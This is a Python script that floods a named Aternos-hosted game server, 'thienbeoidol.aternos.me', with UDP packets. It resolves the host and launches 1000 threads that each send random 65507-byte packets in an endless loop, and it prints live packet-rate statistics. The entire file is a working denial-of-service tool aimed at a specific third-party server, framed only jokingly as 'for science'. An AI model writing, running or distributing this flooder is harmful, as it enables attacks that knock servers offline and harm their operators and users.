import socket
import random
import time
import dns.resolver
import threading
import os
import sys # For better console control

# Target server details
target_hostname = "thienbeoidol.aternos.me"
target_port = 58716

# Resolve the hostname to an IP address
try:
    answers = dns.resolver.resolve(target_hostname, 'A')
    target_ip = str(answers[0])
    print(f"[INIT] Resolved {target_hostname} to IP: {target_ip}")
except Exception as e:
    print(f"[ERROR] Could not resolve hostname: {e}")
    target_ip = None

# Packet size (MAXED OUT for UDP - largest possible payload without fragmentation)
packet_size = 65507 # Max UDP payload size, almost guaranteed to be fragmented and dropped by firewalls

# Number of threads to use (WARNING: THIS WILL BE EXTREMELY RESOURCE INTENSIVE FOR YOUR PC!)
num_threads = 1000 # YEAH, ONE THOUSAND. Your CPU fans are gonna scream.

# Counters and locks
packets_sent_total = 0
packets_sent_this_second = 0
packets_lock = threading.Lock()
running_threads = 0
running_threads_lock = threading.Lock()

def packet_flooder(ip, port, thread_id):
    global packets_sent_total, packets_sent_this_second, running_threads
    
    with running_threads_lock:
        running_threads += 1

    if not ip:
        with running_threads_lock:
            running_threads -= 1
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Set a timeout for sendto operation (optional, can make it more robust if network issues arise)
    # sock.settimeout(1) 
    
    # Generate the large packet data once per thread to save CPU, if you're sending same data
    # data = random._urandom(packet_size) 
    
    print(f"[{thread_id:04d}] Thread ready for flood.")

    while True:
        # Generate random data for each packet to avoid caching/optimization by network devices
        data = random._urandom(packet_size) 
        try:
            sock.sendto(data, (ip, port))
            with packets_lock:
                packets_sent_total += 1
                packets_sent_this_second += 1
        except Exception:
            # Errors will be common with this many threads and large packets
            pass # Suppress to prevent console explosion

def stats_reporter():
    global packets_sent_total, packets_sent_this_second, running_threads
    start_time = time.time()
    while True:
        time.sleep(1) # Report every second
        elapsed_time = time.time() - start_time
        with packets_lock:
            current_second_count = packets_sent_this_second
            packets_sent_this_second = 0 # Reset for next second's count
        
        with running_threads_lock:
            active_threads = running_threads

        # Use sys.stdout.write and flush for continuous single-line update
        sys.stdout.write(f"\r[STATUS] Sent {current_second_count} packets/s | Total: {packets_sent_total} | Active Threads: {active_threads}/{num_threads} | Uptime: {int(elapsed_time)}s")
        sys.stdout.flush()

if __name__ == "__main__":
    if not target_ip:
        print("[CRITICAL] Cannot start flooding without a valid IP address. Exiting.")
        sys.exit(1) # Exit if no IP

    print(f"\n[WARNING] Initiating an EXTREME, UNREASONABLE packet flood with {num_threads} threads on {target_ip}:{target_port}...")
    print("[WARNING] Your PC will likely struggle. Your internet will likely struggle. This is for 'science' only.")
    print("Press Ctrl+C to stop the madness.\n")

    # Start all the flooding threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=packet_flooder, args=(target_ip, target_port, i,))
        t.daemon = True # Daemon threads exit when the main program exits
        threads.append(t)
        t.start()
        # Small delay between starting threads to allow OS to manage resources initially
        # time.sleep(0.001) 

    # Start a separate thread to report stats
    stats_thread = threading.Thread(target=stats_reporter)
    stats_thread.daemon = True
    stats_thread.start()

    # Keep the main thread alive so the daemon threads can run
    try:
        while True:
            time.sleep(1) # Just sleep and let daemon threads do their work
    except KeyboardInterrupt:
        print("\n\n[USER INTERRUPT] Flooding stopped by user. Time to unclench those circuits!")
    finally:
        print("\n[INFO] Main program exiting. The digital storm has passed (from your end, at least).")
